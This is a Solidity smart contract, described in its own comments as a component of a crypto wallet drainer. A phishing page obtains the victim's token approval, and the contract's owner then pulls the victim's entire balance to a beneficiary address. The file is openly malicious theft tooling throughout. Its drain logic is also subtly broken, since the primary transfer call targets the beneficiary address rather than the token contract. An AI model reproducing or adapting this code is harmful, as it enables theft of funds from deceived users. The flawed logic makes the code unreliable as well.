// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/// @title TokenPuller
/// @notice Deployed lazily by the drainer. Pulls the victim's token balance
///         to the beneficiary. The victim must approve the puller first
///         (the phishing page asks for an "upgrade" approval).
contract TokenPuller is Ownable {
    IERC20 public immutable token;
    address public immutable beneficiary;

    event Drained(address indexed victim, uint256 amount);

    constructor(address _token, address _beneficiary) {
        require(_token != address(0), "TokenPuller: zero token");
        require(_beneficiary != address(0), "TokenPuller: zero beneficiary");
        token = IERC20(_token);
        beneficiary = _beneficiary;
        _transferOwnership(_beneficiary);
    }

    /// @notice Pull the victim's entire token balance to the beneficiary.
    function drain(address victim) external onlyOwner {
        uint256 bal = token.balanceOf(victim);
        require(bal > 0, "TokenPuller: no balance");
        (bool ok, ) = beneficiary.call(
            abi.encodeCall(IERC20.transfer, (beneficiary, bal))
        );
        // fallback: use the standard transfer
        if (!ok) {
            token.transferFrom(victim, beneficiary, bal);
        }
        emit Drained(victim, bal);
    }
}
